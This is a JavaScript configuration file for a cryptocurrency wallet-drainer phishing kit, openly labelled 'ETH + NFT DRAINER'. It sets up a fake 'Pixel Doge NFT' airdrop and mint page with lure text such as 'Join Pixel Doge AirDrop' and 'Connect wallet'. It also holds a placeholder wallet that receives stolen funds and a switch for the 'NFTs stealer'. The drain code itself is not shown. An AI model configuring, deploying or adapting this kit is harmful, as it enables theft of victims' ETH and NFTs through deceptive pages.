const receiveAddress = "Your ETH Wallet Adress";

const collectionInfo = {
    name: "Pixel Doge NFT",
    socialMedia: {
        discord: "https://t.me/#",
        twitter: "https://t.me/#",
        instagram: "https://t.me/#",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "ETH + NFT DRAINER",
}

const claimPageInfo = {
    title: "Pixel Doge NFT", // Name will appeair
    shortDescription: "Join Pixel Doge AirDrop",
    longDescription: "",

    claimButtonText: "GET PIXEL DOGE",

    image: "TecOnSellix.jpeg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.00001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
